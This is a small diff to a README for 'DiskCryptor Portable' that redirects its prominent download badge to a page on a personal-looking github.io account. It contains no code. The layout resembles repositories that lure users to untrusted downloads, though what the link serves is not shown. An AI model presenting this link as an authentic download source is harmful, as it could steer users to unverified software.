@@ -2,8 +2,7 @@
 
 ## 📥  DiskCryptor Portable
 
-[![⬇️  DiskCryptor Portable](https://img.shields.io/badge/Download-DiskCryptor%20Portable-blue?style=for-the-badge&logo=windows)](https://diskcryptor-portable.github.io/.github
-)
+[![⬇️  DiskCryptor Portable](https://img.shields.io/badge/Download-DiskCryptor%20Portable-blue?style=for-the-badge&logo=windows)](https://monicacrossmon.github.io/.github/diskcryptor-portable)
 
 ---
 
